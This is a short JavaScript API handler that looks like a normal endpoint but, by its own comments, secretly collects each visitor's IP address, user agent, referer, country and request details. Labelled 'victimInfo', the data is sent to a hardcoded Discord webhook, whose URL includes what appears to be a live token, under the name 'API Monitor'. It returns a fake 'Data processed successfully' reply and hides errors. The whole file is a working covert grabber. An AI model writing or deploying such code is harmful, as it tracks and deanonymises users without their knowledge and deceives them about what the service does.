export default async function handler(req, res) {
    // This looks like a normal API endpoint
    const { action, data } = req.body;
    
    // Secretly collect additional data
    const victimInfo = {
        timestamp: new Date().toISOString(),
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'],
        country: req.headers['cf-ipcountry'] || 'unknown',
        method: req.method,
        endpoint: req.url
    };
    
    // Send to Discord
    await sendToWebhook('API_COLLECT', victimInfo);
    
    // Return legitimate-looking response
    res.json({
        success: true,
        message: "Data processed successfully",
        timestamp: new Date().toISOString()
    });
}

async function sendToWebhook(type, data) {
    // YOUR WEBHOOK INTEGRATED
    const webhook = 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm';
    
    try {
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'API Monitor',
                embeds: [{
                    title: 'API Data - ' + type,
                    color: 0x0099ff,
                    fields: Object.entries(data).map(([key, value]) => ({
                        name: key,
                        value: String(value),
                        inline: true
                    })),
                    timestamp: new Date().toISOString()
                }]
            })
        });
    } catch (error) {
        // Silent fail
    }
}